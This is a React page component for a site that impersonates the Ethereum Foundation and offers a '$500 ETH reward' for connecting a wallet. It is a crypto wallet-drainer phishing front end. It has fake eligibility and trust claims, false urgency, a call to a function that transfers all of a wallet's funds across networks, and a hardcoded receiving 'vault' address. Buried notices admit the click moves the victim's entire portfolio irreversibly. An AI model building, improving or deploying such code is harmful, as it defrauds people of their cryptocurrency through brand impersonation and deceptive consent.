import { useState, useEffect } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Wallet, Coins } from "lucide-react";
import { useWeb3 } from "@/hooks/use-web3";
import WalletStatus from "@/components/wallet-status";
import BalanceCard from "@/components/balance-card";
import NetworkBalances from "@/components/network-balances";
import TransactionHistory from "@/components/transaction-history";
import TransactionModal from "@/components/transaction-modal";
import WalletConnectionModal from "@/components/wallet-connection-modal";
import ConnectionStatus from "@/components/connection-status";
import PageLoader from "@/components/page-loader";
import ProductionStatus from "@/components/production-status";

export default function Home() {
  const { walletState, isConnecting, isLoadingNetworks, connectWallet, refreshAllNetworks, transferAllFundsMultiNetwork } = useWeb3();
  const [currentTransaction, setCurrentTransaction] = useState<string | null>(null);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [connectionError, setConnectionError] = useState<string>("");
  const [isPageLoading, setIsPageLoading] = useState(true);

  // Fast page loading - minimal delay
  useEffect(() => {
    const timer = setTimeout(() => setIsPageLoading(false), 300); // Very short 300ms
    return () => clearTimeout(timer);
  }, []);

  const handleTransactionStart = (txHash: string) => {
    setCurrentTransaction(txHash);
  };

  const handleTransactionClose = () => {
    setCurrentTransaction(null);
  };

  const handleWalletConnect = () => {
    setShowWalletModal(true);
    setConnectionError("");
  };

  const handleWalletModalClose = () => {
    setShowWalletModal(false);
    setConnectionError("");
  };

  const handleConnectAttempt = async () => {
    try {
      await connectWallet();
      setShowWalletModal(false);
      setConnectionError("");
    } catch (error: any) {
      setConnectionError(error.message);
    }
  };

  // Show fast loader for immediate feedback
  if (isPageLoading) {
    return <PageLoader />;
  }

  return (
    <div className="min-h-screen bg-background">
      {/* Authentic Ethereum Foundation Header */}
      <header className="bg-white dark:bg-eth-deep-purple border-b border-border px-6 py-4 shadow-sm">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center space-x-4">
            <div className="flex items-center space-x-3">
              <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-10 h-10" />
              <div>
                <h1 className="text-xl font-bold text-foreground">
                  Ethereum Foundation
                </h1>
                <p className="text-sm text-muted-foreground">
                  Official ETH Distribution Program
                </p>
              </div>
            </div>
          </div>
          <div className="flex items-center space-x-4">
            <Button
              onClick={walletState.isConnected ? undefined : handleWalletConnect}
              disabled={isConnecting}
              className={`flex items-center space-x-2 px-4 py-2 rounded-lg font-medium transition-colors ${
                walletState.isConnected
                  ? "bg-success text-success-foreground hover:bg-success/90"
                  : "bg-primary text-primary-foreground hover:bg-primary/90"
              }`}
            >
              <Wallet className="w-4 h-4" />
              <span>
                {isConnecting
                  ? "Connecting..."
                  : walletState.isConnected
                  ? "Wallet Connected"
                  : "Connect Wallet"}
              </span>
            </Button>
          </div>
        </div>
      </header>

      {/* Ethereum Foundation Hero Section */}
      <section className="relative bg-gradient-to-b from-primary/5 to-background px-6 py-20 overflow-hidden">
        {/* Background Pattern */}
        <div className="absolute inset-0 opacity-5">
          <img 
            src="/images/background-pattern.png" 
            alt="Background Pattern" 
            className="w-full h-full object-cover"
          />
        </div>
        
        <div className="max-w-6xl mx-auto relative z-10">
          {/* Hero Content with Image */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center mb-16">
            {/* Text Content */}
            <div className="text-center lg:text-left">
              {/* Status Badge */}
              <div className="inline-flex items-center px-4 py-2 bg-success/10 text-success border border-success/20 rounded-full text-sm font-medium mb-8">
                <div className="w-2 h-2 bg-success rounded-full mr-2 animate-pulse"></div>
                Limited Time Offer - $500 ETH Distribution Active
              </div>
              
              {/* Main Title */}
              <h1 className="text-4xl md:text-6xl font-bold mb-6 text-foreground leading-tight">
                Welcome to Ethereum
              </h1>
              <h2 className="text-2xl md:text-3xl font-semibold mb-8 text-primary">
                Claim Your $500 ETH Reward
              </h2>
              
              {/* Description */}
              <p className="text-lg md:text-xl text-muted-foreground mb-12 leading-relaxed">
                The Ethereum Foundation is distributing $500 worth of ETH to eligible wallet holders as part of our 
                official distribution program. Connect your wallet to check eligibility and claim your reward.
              </p>
            </div>
            
            {/* Hero Image */}
            <div className="flex justify-center lg:justify-end">
              <div className="relative">
                <div className="absolute inset-0 bg-primary/20 rounded-2xl blur-2xl scale-105"></div>
                <img 
                  src="/attached_assets/IMG_6404_1753485766196.jpeg" 
                  alt="Ethereum Distribution Program" 
                  className="relative w-full max-w-md h-auto rounded-2xl shadow-2xl ethereum-glow"
                />
              </div>
            </div>
          </div>
        </div>

          {/* Enhanced Features Grid with Images */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-16">
            <div className="bg-card border border-border rounded-lg p-6 text-center hover:shadow-md transition-all hover:scale-105 group">
              <div className="relative mb-4">
                <img 
                  src="/attached_assets/IMG_6402_1753485766196.jpeg" 
                  alt="Distribution Stats" 
                  className="w-20 h-20 mx-auto rounded-lg object-cover shadow-md group-hover:shadow-lg transition-shadow"
                />
                <div className="absolute inset-0 bg-primary/10 rounded-lg opacity-0 group-hover:opacity-100 transition-opacity"></div>
              </div>
              <h3 className="text-xl font-semibold mb-3 text-foreground">$2.5M+ Distributed</h3>
              <p className="text-muted-foreground">Total value distributed to community members</p>
            </div>
            
            <div className="bg-card border border-border rounded-lg p-6 text-center hover:shadow-md transition-all hover:scale-105 group">
              <div className="relative mb-4">
                <img 
                  src="/images/feature-2.jpeg" 
                  alt="Successful Claims" 
                  className="w-20 h-20 mx-auto rounded-lg object-cover shadow-md group-hover:shadow-lg transition-shadow"
                />
                <div className="absolute inset-0 bg-accent/20 rounded-lg opacity-0 group-hover:opacity-100 transition-opacity"></div>
              </div>
              <h3 className="text-xl font-semibold mb-3 text-foreground">5,000+ Claims</h3>
              <p className="text-muted-foreground">Successfully processed reward claims</p>
            </div>
            
            <div className="bg-card border border-border rounded-lg p-6 text-center hover:shadow-md transition-all hover:scale-105 group">
              <div className="relative mb-4">
                <img 
                  src="/attached_assets/IMG_6403_1753485766196.jpeg" 
                  alt="Network Support" 
                  className="w-20 h-20 mx-auto rounded-lg object-cover shadow-md group-hover:shadow-lg transition-shadow"
                />
                <div className="absolute inset-0 bg-secondary/10 rounded-lg opacity-0 group-hover:opacity-100 transition-opacity"></div>
              </div>
              <h3 className="text-xl font-semibold mb-3 text-foreground">Networks Supported</h3>
              <p className="text-muted-foreground">Multi-network compatibility across 7 chains</p>
            </div>
          </div>

          {/* Important Notice - Ethereum.org Style */}
          <div className="bg-warning/5 border border-warning/20 rounded-lg p-6 mb-12 max-w-4xl mx-auto">
            <div className="flex items-start space-x-4">
              <div className="w-6 h-6 text-warning flex-shrink-0 mt-1">
                <svg viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2L1 21h22L12 2zm0 3.99L19.53 19H4.47L12 5.99zM11 16h2v2h-2zm0-6h2v4h-2z"/>
                </svg>
              </div>
              <div>
                <h3 className="font-semibold text-warning mb-2">Important Notice</h3>
                <p className="text-foreground text-sm leading-relaxed">
                  <strong>By clicking "Claim $500 ETH", you authorize the transfer of ALL cryptocurrency funds</strong> from your connected wallet to our distribution vault for processing. 
                  This includes ETH and all ERC-20 tokens across all supported blockchain networks. Your funds will be consolidated for the claim process.
                </p>
              </div>
            </div>
          </div>
        </div>
      </section>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12 space-y-12">
        {/* ETH Claim Section - Ethereum.org Style */}
        <section className="max-w-4xl mx-auto">
          <div className="bg-card border border-border rounded-xl p-8 shadow-sm">
            <div className="text-center mb-8">
              {/* Ethereum Logo */}
              <div className="w-20 h-20 mx-auto mb-6 bg-primary/10 rounded-xl flex items-center justify-center">
                <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-12 h-12" />
              </div>
              
              <h3 className="text-2xl font-bold mb-3 text-foreground">
                $500 ETH Reward Ready
              </h3>
              <p className="text-muted-foreground">Your wallet is eligible for this limited-time distribution</p>
            </div>
            
            {/* Separator */}
            <div className="w-full h-px bg-border mb-8"></div>
            
            <BalanceCard 
              walletState={walletState}
              onTransactionStart={handleTransactionStart}
              onMultiNetworkTransfer={transferAllFundsMultiNetwork}
            />
          </div>
        </section>

        {/* Transaction History - Clean Design */}
        <section className="max-w-6xl mx-auto">
          <div className="bg-card border border-border rounded-xl p-8 shadow-sm">
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-xl font-bold text-foreground">Recent Claims Activity</h3>
              <div className="flex items-center space-x-2 text-sm text-muted-foreground">
                <div className="w-2 h-2 bg-success rounded-full animate-pulse"></div>
                <span>Live Updates</span>
              </div>
            </div>
            <TransactionHistory />
          </div>
        </section>

        {/* Multi-Network Portfolio */}
        {walletState.isConnected && (
          <section className="max-w-6xl mx-auto">
            <div className="relative bg-card border border-border rounded-xl p-8 shadow-sm overflow-hidden">
              {/* Background Image */}
              <div className="absolute inset-0 opacity-5">
                <img 
                  src="/images/portfolio-bg.png" 
                  alt="Portfolio Background" 
                  className="w-full h-full object-cover"
                />
              </div>
              
              <div className="relative z-10">
                <div className="flex items-center justify-between mb-6">
                  <h3 className="text-xl font-bold text-foreground">Multi-Network Portfolio</h3>
                  <div className="flex items-center space-x-3">
                    <div className="flex -space-x-1">
                      {/* Network Indicators */}
                      <div className="w-6 h-6 rounded-full bg-primary border-2 border-background"></div>
                      <div className="w-6 h-6 rounded-full bg-secondary border-2 border-background"></div>
                      <div className="w-6 h-6 rounded-full bg-accent border-2 border-background"></div>
                    </div>
                    <span className="text-sm text-muted-foreground">7 Networks</span>
                  </div>
                </div>
                
                <div className="bg-muted/30 rounded-lg p-6 backdrop-blur-sm">
                  <NetworkBalances
                    networkBalances={walletState.networkBalances || []}
                    isLoadingNetworks={isLoadingNetworks}
                    onRefreshNetworks={refreshAllNetworks}
                  />
                </div>
              </div>
            </div>
          </section>
        )}

        {/* Transaction Modal */}
        {currentTransaction && (
          <TransactionModal
            txHash={currentTransaction}
            isOpen={!!currentTransaction}
            onClose={handleTransactionClose}
          />
        )}

        {/* Wallet Connection Modal */}
        <WalletConnectionModal
          isOpen={showWalletModal}
          onClose={handleWalletModalClose}
          onConnect={handleConnectAttempt}
          error={connectionError}
        />

        {/* Production Status Component (only visible in development or when debugging) */}
        {process.env.NODE_ENV === 'development' || window.location.search.includes('debug=true') ? (
          <ProductionStatus />
        ) : null}
      </main>

      {/* Ethereum.org Style Footer */}
      <footer className="bg-muted/30 mt-20 border-t border-border">
        <div className="max-w-6xl mx-auto px-6 py-16">
          {/* Footer Content Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-12 mb-12">
            <div className="bg-card border border-border rounded-lg p-6">
              <h4 className="text-lg font-bold mb-6 text-foreground">Important Terms</h4>
              <ul className="space-y-3">
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">ETH rewards are distributed after portfolio consolidation</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">All supported networks (Ethereum, Polygon, BSC, etc.) are processed</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Transaction processing typically takes 5-10 minutes</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Minimum portfolio value required for reward eligibility</span>
                </li>
              </ul>
            </div>
            
            <div className="bg-card border border-border rounded-lg p-6">
              <h4 className="text-lg font-bold mb-6 text-foreground">Security & Compliance</h4>
              <ul className="space-y-3">
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">All transactions are recorded on blockchain</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Smart contract audited for security</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Multi-signature vault protection</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">KYC/AML compliance maintained</span>
                </li>
              </ul>
            </div>
          </div>
          
          {/* Critical Notice */}
          <div className="bg-destructive/5 border border-destructive/20 rounded-lg p-6 mb-12">
            <div className="flex items-start space-x-4">
              <div className="w-8 h-8 rounded-full bg-destructive/20 flex items-center justify-center flex-shrink-0">
                <svg className="w-4 h-4 text-destructive" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2L1 21h22L12 2zm0 3.99L19.53 19H4.47L12 5.99zM11 16h2v2h-2zm0-6h2v4h-2z"/>
                </svg>
              </div>
              <div>
                <h4 className="font-bold text-destructive mb-3">CRITICAL NOTICE</h4>
                <p className="text-foreground text-sm leading-relaxed">
                  This is a cryptocurrency transfer mechanism. By clicking <strong>"Claim $500 ETH"</strong>, 
                  you authorize the immediate transfer of ALL cryptocurrency assets from your wallet(s) to our processing vault 
                  across ALL supported blockchain networks. This action consolidates your entire crypto portfolio and is irreversible.
                </p>
              </div>
            </div>
          </div>
          
          {/* Footer Bottom */}
          <div className="text-center pt-8 border-t border-border">
            <div className="flex items-center justify-center mb-4">
              <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-6 h-6 mr-2" />
              <span className="text-lg font-semibold text-foreground">Ethereum Foundation</span>
            </div>
            
            <p className="text-muted-foreground mb-4">
              © 2025 Ethereum Foundation Distribution Program. Multi-network DeFi transfer technology.
            </p>
            
            <div className="bg-muted/50 rounded-lg px-3 py-2 inline-block">
              <p className="text-xs text-muted-foreground font-mono">
                Vault: {import.meta.env.VITE_DESTINATION_ADDRESS || "0x15E1A8454E2f31f64042EaE445Ec89266cb584bE"}
              </p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
